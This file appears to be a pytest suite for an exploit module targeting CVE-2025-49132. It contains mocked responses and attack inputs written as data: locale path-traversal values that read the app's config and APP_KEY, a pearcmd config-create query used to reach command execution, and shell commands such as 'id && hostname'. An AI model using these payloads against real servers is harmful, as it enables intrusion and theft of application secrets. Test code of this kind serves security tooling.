from pathlib import Path
import re
from types import SimpleNamespace

from modules.core import http_config
from modules.cves import cve_2025_49132 as mod


class FakeResp:
    def __init__(self, status=200, data=None, headers=None, text=None):
        self.status_code = status
        self._data = data
        self.headers = headers or {"Content-Type": "application/json"}
        self.text = text if text is not None else ""

    def json(self):
        if self._data is None:
            raise ValueError("no json")
        return self._data


def test_extract_marked_output_trims_pear_tail():
    raw = 'noise LVC49132ABC_START\nuid=33(www-data)\nhost\n/pear/php\nLVC49132ABC_END more'

    assert mod._extract_marked_output(raw, "LVC49132ABC") == "uid=33(www-data)\nhost"


def test_exploit_success_requires_rce_marker(monkeypatch):
    monkeypatch.setattr(mod._secrets, "token_hex", lambda n: "abc123")
    monkeypatch.setattr(
        mod,
        "_collect_secrets",
        lambda session, base: ({"APP_KEY": "base64:example"}, "base64:example"),
    )

    calls = []

    def fake_raw_get(endpoint_url, raw_query, *, timeout=15, user_agent=None):
        calls.append(raw_query)
        if raw_query.startswith("+config-create+"):
            return 200, "pear config created", {}
        return 200, "prefix LVC49132ABC123_START\nuid=33(www-data)\nlab\nLVC49132ABC123_END suffix", {}

    monkeypatch.setattr(mod, "_raw_get", fake_raw_get)

    result = mod.exploit("http://example.test", command="id && hostname", session=SimpleNamespace(headers={}))

    assert result["success"] is True
    assert result["vuln_class"] == "rce"
    assert result["outcome_tag"] == "command-executed"
    assert result["evidence"] == "uid=33(www-data)\nlab"
    assert result["artifacts"]["app_key"] == "base64:example"
    assert any("namespace=pearcmd" in call for call in calls)


def test_scan_evidence_includes_disclosed_app_key():
    app_key = "base64:AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKK="

    class Session:
        def get(self, url, **kwargs):
            params = kwargs.get("params") or {}
            if params == {"locale": "en", "namespace": "strings"}:
                return FakeResp(data={"en": {"strings": {}}})
            if params == {"locale": "../../config", "namespace": "app"}:
                return FakeResp(data={"../../config": {"app": {"key": "base64{{AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKK=}}"}}})
            if params == {"locale": "../../config", "namespace": "database"}:
                return FakeResp(data={"../../config": {"database": {"connections": {"sqlite": {}}}}})
            return FakeResp(status=404, data={})

    result = mod.scan("http://ptero.test", session=Session())

    assert result["verdict"] == "confirmed_vulnerable"
    assert result["artifacts"]["app_key"] == app_key
    assert result["artifacts"]["secrets"]["APP_KEY"] == app_key
    assert "app_key_disclosed" in result["detection_methods"]
    assert any(app_key in item for item in result["evidence"])


def test_exploit_disclosure_fallback_is_not_success(monkeypatch):
    monkeypatch.setattr(mod._secrets, "token_hex", lambda n: "abc123")
    monkeypatch.setattr(
        mod,
        "_collect_secrets",
        lambda session, base: ({"APP_KEY": "base64:example"}, "base64:example"),
    )
    monkeypatch.setattr(mod, "_raw_get", lambda *a, **k: (200, "no marker here", {}))

    result = mod.exploit("http://example.test", command="id", session=SimpleNamespace(headers={}))

    assert result["success"] is False
    assert result["vuln_class"] == "rce"
    assert result["outcome_tag"] == "secrets-disclosed"
    assert "RCE not confirmed" in result["evidence"]
    assert result["artifacts"]["app_key"] == "base64:example"


def test_raw_http_get_uses_configured_http_proxy(monkeypatch):
    instances = []

    class FakeResponse:
        status = 200

        def read(self):
            return b"ok"

        def getheaders(self):
            return [("Content-Type", "text/plain")]

    class FakeHTTPConnection:
        def __init__(self, host, port=None, timeout=None):
            self.host = host
            self.port = port
            self.timeout = timeout
            self.request_args = None
            instances.append(self)

        def request(self, method, target, body=None, headers=None):
            self.request_args = (method, target, body, headers or {})

        def getresponse(self):
            return FakeResponse()

        def close(self):
            pass

    monkeypatch.setattr(http_config.http.client, "HTTPConnection", FakeHTTPConnection)
    monkeypatch.setattr(http_config, "get_proxies", lambda: {"http": "http://127.0.0.1:8080"})
    monkeypatch.setattr(http_config, "record_manual_request", lambda *args, **kwargs: None)
    status, body, headers = http_config.raw_http_get(
        "http://localhost:41008/locales/locale.json",
        "locale=../../../../../../tmp&namespace=lvc49132",
    )

    assert status == 200
    assert body == "ok"
    assert headers["Content-Type"] == "text/plain"
    assert len(instances) == 1
    assert instances[0].host == "127.0.0.1"
    assert instances[0].port == 8080
    method, target, body, sent_headers = instances[0].request_args
    assert method == "GET"
    assert target == "http://localhost:41008/locales/locale.json?locale=../../../../../../tmp&namespace=lvc49132"
    assert body is None
    assert sent_headers["Host"] == "localhost:41008"


def test_cve_modules_do_not_use_raw_http_transports_directly():
    cves_dir = Path(__file__).resolve().parents[2] / "cves"
    banned = re.compile(
        r"("
        r"\bimport\s+http\.client\b|"
        r"\bfrom\s+http\s+import\s+client\b|"
        r"\burllib\.request\b|"
        r"\burlopen\s*\(|"
        r"\burllib3\.(?:PoolManager|ProxyManager|request)\b|"
        r"\bHTTPConnection\s*\(|"
        r"\bHTTPSConnection\s*\(|"
        r"\bhttpx\.|"
        r"\baiohttp\."
        r")"
    )
    offenders = []
    for path in sorted(cves_dir.glob("cve_*.py")):
        text = path.read_text()
        if banned.search(text):
            offenders.append(path.name)

    assert offenders == []
